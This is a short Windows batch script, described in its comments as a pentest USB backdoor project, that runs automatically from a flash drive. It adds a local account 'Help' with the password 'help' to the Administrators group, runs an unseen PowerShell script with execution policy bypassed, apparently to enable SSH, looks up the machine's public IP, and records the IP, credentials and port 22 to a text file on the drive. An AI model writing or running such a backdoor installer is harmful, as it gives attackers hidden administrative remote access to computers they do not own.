@echo off
REM Test Project, Pentest USB Backdoor
 
REM Idea:
 
REM Connect USB Flash Drive to PC
REM Run command, make SSH Backdoor
REM Show prompt when finished
REM Write IP, Username, Password to txt
REM Remove USB Flash Drive.

REM All commands done automatically.
net user "Help" "help" /add
net localgroup "Administrators" "Help" /add
Powershell -ExecutionPolicy Bypass -File E:\bd.ps1
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
echo %DATE%%TIME% >> E:\output.txt
echo Username: Help >> E:\output.txt
echo Password: help >> E:\output.txt
echo Public IP: %PublicIP% >> E:\output.txt
echo Port: 22>> E:\output.txt
PAUSE